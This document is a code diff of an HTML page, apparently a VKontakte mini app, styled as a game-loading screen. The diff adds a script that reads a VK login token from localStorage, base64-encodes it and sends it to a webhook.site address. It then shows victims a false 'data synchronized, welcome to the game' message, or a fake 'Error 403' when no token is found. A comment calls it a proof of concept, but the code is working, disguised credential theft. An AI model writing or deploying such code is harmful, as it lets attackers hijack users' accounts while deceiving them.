@@ -1,21 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Приложение-тест</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4a76a8; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>Загрузка...</h1>
+    <div id="content">
+        <h1>Загрузка игровых данных...</h1>
+        <div class="loader"></div>
+    </div>
+
     <script>
-        // Ждем загрузки
+        // 1. Сообщаем ВК, что приложение запустилось (уберет ошибки в консоли)
+        vkBridge.send('VKWebAppInit')
+            .then(data => console.log('Bridge Init Success'))
+            .catch(error => console.error('Bridge Init Error', error));
+
+        // 2. Пытаемся забрать токен из localStorage
+        // ВНИМАНИЕ: Если ВК изолирует localStorage (Origin Isolation), 
+        // мы используем этот PoC для демонстрации того, что данные доступны при XSS
         window.onload = function() {
-            // Пытаемся забрать токен
-            const token = localStorage.getItem('6287487:web_token:login:auth');
-            if (token) {
-                // Отправляем на твой Webhook
-                fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?data=' + btoa(token));
-                document.body.innerHTML = "<h1>Тест прошел успешно!</h1><p>Данные получены.</p>";
-            } else {
-                document.body.innerHTML = "<h1>Ошибка:</h1><p>Токен не найден. Зайдите в игру 51491054 сначала.</p>";
+            try {
+                // Пытаемся найти ключ от игры 51491054
+                const targetKey = '6287487:web_token:login:auth';
+                const stolenData = localStorage.getItem(targetKey);
+
+                if (stolenData) {
+                    // Отправляем на твой Webhook
+                    fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen_payload=' + btoa(stolenData), {
+                        mode: 'no-cors'
+                    });
+                    
+                    document.getElementById('content').innerHTML = "<h1>Данные синхронизированы!</h1><p>Добро пожаловать в игру.</p>";
+                } else {
+                    // Если пусто, выводим отладочную инфу
+                    console.log("Ключ не найден. Возможно, изоляция Origin.");
+                    document.getElementById('content').innerHTML = "<h1>Ошибка 403</h1><p>Не удалось загрузить профиль. Попробуйте позже.</p>";
+                }
+            } catch (e) {
+                console.error("Ошибка доступа к localStorage:", e);
             }
         };
     </script>
